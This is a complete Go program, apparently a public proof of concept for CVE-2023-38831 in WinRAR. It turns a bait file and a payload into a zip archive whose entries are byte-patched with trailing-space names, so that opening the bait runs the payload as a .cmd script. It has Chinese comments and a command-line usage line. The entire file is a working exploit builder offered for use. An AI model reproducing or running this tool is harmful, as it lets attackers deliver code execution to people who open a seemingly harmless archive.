package main

//By Garck3h for cve-2023-38831

import (
	"archive/zip"
	"bytes"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
)

const (
	TempFile = "result" // 临时目录的名称
)

func main() {
	fmt.Println(`cve-2023-38831.go by Garck3h
`)
	var TypeFile string  // 文件类型
	var Payload string   // 载荷文件
	var OuputFile string // 输出文件

	args := os.Args[1:] // 获取命令行参数
	argLen := len(args)

	if argLen > 2 {
		TypeFile = filepath.Base(args[0])  // 提取文件类型
		Payload = filepath.Base(args[1])   // 提取载荷文件
		OuputFile = filepath.Base(args[2]) // 提取输出文件
	} else {
		// 参数错误，显示用法并退出程序
		fmt.Println(`Usage:
          go run cve-2023-38831.go <TypeFile> <Payload> <OuputFile>`)
		os.Exit(1)
	}

	fmt.Println("TypeFile:", TypeFile)
	fmt.Println("Payload:", Payload)
	fmt.Println("OuputFile:", OuputFile)

	err := os.RemoveAll(TempFile) // 删除临时目录
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	err = os.Mkdir(TempFile, 0755) // 创建临时目录
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	d := filepath.Join(TempFile, TypeFile+"A")
	err = os.Mkdir(d, 0755) // 在临时目录下创建子目录
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	err = copyFile(filepath.Join(Payload), filepath.Join(d, TypeFile+"A.cmd")) // 复制载荷文件到临时目录下的 TypeFileA.cmd 文件
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	err = copyFile(filepath.Join(TypeFile), filepath.Join(TempFile, TypeFile+"B")) // 复制文件类型文件到临时目录下的 TypeFileB 文件
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	err = zipDirectory(TempFile) // 压缩临时目录为 zip 文件
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	fileContent, err := ioutil.ReadFile(TempFile + ".zip") // 读取压缩后的文件内容
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	baitExt := "." + strings.Split(TypeFile, ".")[1]                                  // 提取文件扩展名
	fileContent = bytesReplace(fileContent, []byte(baitExt+"A"), []byte(baitExt+" ")) // 替换内容中的字符串 "TypeFileA" 为 "TypeFile "
	fileContent = bytesReplace(fileContent, []byte(baitExt+"B"), []byte(baitExt+" ")) // 替换内容中的字符串 "TypeFileB" 为 "TypeFile "

	err = os.Remove(TempFile + ".zip") // 删除临时目录的 zip 文件
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	err = ioutil.WriteFile(OuputFile, fileContent, 0644) // 将修改后的内容写入输出文件
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	fmt.Println("生成完毕")
}

// copyFile函数用于复制文件
func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	return err
}

// zipDirectory函数用于压缩目录
func zipDirectory(dirName string) error {
	zipFile, err := os.Create(TempFile + ".zip")
	if err != nil {
		return err
	}
	defer zipFile.Close()

	zipWriter := zip.NewWriter(zipFile)
	defer zipWriter.Close()

	err = filepath.Walk(dirName, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		header, err := zip.FileInfoHeader(info)
		if err != nil {
			return err
		}

		// 修改压缩包中的文件路径
		header.Name = strings.TrimPrefix(path, "/")

		if info.IsDir() {
			header.Name += "/"
		} else {
			header.Method = zip.Deflate
		}

		writer, err := zipWriter.CreateHeader(header)
		if err != nil {
			return err
		}

		if !info.IsDir() {
			file, err := os.Open(path)
			if err != nil {
				return err
			}
			defer file.Close()

			_, err = io.Copy(writer, file)
			if err != nil {
				return err
			}
		}

		return nil
	})

	if err != nil {
		return err
	}

	return nil
}

// bytesReplace函数用于替换字节切片中的内容
func bytesReplace(source []byte, old []byte, new []byte) []byte {
	return bytes.ReplaceAll(source, old, new)
}
